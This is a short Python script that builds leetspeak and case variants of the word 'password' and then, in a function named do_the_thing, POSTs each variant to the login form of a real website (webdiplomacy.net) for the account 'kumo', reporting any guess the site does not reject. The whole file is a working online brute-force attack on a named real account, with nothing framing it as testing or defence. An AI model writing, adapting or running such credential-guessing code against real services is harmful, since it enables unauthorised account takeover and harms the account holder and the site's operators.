from collections import defaultdict
equivalences = [
    {'A', 'a', '4'},
    {'B', 'b', '8'},
    {'C', 'c'},
    {'D', 'd'},
    {'E', 'e', '3'},
    {'F', 'f'},
    {'G', 'g'},
    {'H', 'h'},
    {'I', 'i', '1'},
    {'J', 'j'},
    {'K', 'k', 'c'},
    {'L', 'l', 'i'},
    {'M', 'm'},
    {'N', 'n'},
    {'O', 'o', '0'},
    {'P', 'p'},
    {'Q', 'q'},
    {'R', 'r'},
    {'S', 's', '5'},
    {'T', 't'},
    {'U', 'u', 'v'},
    {'V', 'v'},
    {'W', 'w'},
    {'X', 'x'},
    {'Y', 'y'},
    {'Z', 'z', 's'}
]
total_chars = set()
for x in equivalences:
    total_chars = total_chars.union(x)

equivalence_map = defaultdict(list)
for c in total_chars:
    for e in equivalences:
        if c in e:
            for c2 in e:
                equivalence_map[c].append(c2)


def get_mutated_pws(pw):
    pw_list = list(pw)
    mutated_pws = set()
    for idx, c in enumerate(pw_list):
        for replacement_char in equivalence_map[c]:
            pw_list[idx] = replacement_char
            mutated_pw = ''.join(pw_list)
            mutated_pws.add(mutated_pw)
        pw_list[idx] = c
    return mutated_pws

def mutate_pw(pw, max_iter = 1):
    cnt = 0

    all_pwds = set()
    all_pwds.add(pw)

    unchecked_pwds = set()
    unchecked_pwds.add(pw)

    while len(unchecked_pwds) > 0 and cnt < max_iter:
        unchecked_pwd = unchecked_pwds.pop()

        mutated_pwds = get_mutated_pws(unchecked_pwd)

        for mutated_pwd in mutated_pwds:
            if mutated_pwd in all_pwds:
                continue
            else:
                unchecked_pwds.add(mutated_pwd)
                all_pwds.add(mutated_pwd)
        cnt += 1
    return all_pwds

all_pwds = mutate_pw('password', max_iter=10000)

def do_the_thing():
    import requests
    import time

    r = None
    for idx, pw in enumerate(all_pwds):
        print(f'Trying {idx}: {pw}')
        r = requests.post('https://webdiplomacy.net/index.php', data=dict(loginuser='kumo',loginpass=pw))
        r.raise_for_status()
        time.sleep(0.1)
        if r.content.decode('utf-8').find('The password you entered is incorrect.') == -1:
            print(f"This password succeeded: {pw}")
